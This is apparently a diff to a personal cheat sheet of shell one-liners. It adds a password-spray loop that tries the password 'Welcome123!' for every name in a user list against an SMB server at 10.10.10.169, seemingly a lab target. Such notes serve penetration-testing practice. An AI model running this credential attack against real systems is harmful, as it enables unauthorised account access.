@@ -4,3 +4,6 @@ find . -name '*' -exec file {} \; | grep -o -P '^.+: \w+ image'
 # strip file extensions
 for s in $(for x in $(ls *.c); do echo $x | cut -d '.' -f 1; done); do mv $s* $s; done
 
+# Password spray against smb
+for LINE in `cat userlist.txt`;do printf "Welcome123!" | smbclient -L //10.10.10.169/ -U $LINE;done
+
